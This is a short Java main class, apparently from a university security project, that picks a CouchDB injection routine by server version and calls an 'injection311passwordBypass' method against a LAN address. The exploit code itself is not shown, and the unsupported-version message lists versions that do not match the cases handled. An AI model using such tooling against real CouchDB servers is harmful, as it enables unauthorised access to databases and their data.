package it.org.polito.couchdb;
import it.org.polito.couchdb.CouchDBInjection;

import java.io.IOException;

public class Main {

    public static void main(String[] args) throws IOException {
        CouchDBInjection db = new CouchDBInjection("http://192.168.1.162:3000", "3.1.1");
        switch(db.getVersion()){
            case "1.6.1":
                // do something
                db.injection161("");
                break;
            case "3.1.1":
                // do something
                db.injection311passwordBypass("");
                break;
            default:
                System.out.println("Version of CouchDB not supported, try with 1.6.1 or 2.3.0\n");
        }
    }
}
